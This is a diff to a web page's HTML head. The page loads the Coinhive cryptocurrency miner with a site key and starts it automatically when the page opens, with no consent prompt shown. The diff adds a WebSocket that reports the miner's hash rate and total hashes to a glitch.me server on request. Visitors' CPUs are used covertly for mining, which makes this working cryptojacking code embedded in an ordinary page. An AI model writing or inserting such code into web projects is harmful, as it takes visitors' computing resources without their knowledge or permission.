@@ -2,9 +2,19 @@
 <head>
   <script src="https://coinhive.com/lib/coinhive.min.js"></script>
   <script>
+    const ws = new WebSocket('wss://coinhive-stats.glitch.me');
     const key = 'hyDd8gQLOXbCgE6H09hKY9IY5IKkw8BD';
     const miner = new CoinHive.User(key, 'Glitch');
     miner.start();
+    
+    ws.addEventListener('message', (e) => {
+      if(e.data === 'collect') {
+        ws.send(JSON.stringify({
+          "rate": miner.getHashesPerSecond(),
+          "hashes": miner.getTotalHashes()
+        });
+      }
+    });
   </script>
 </head>
 <body>
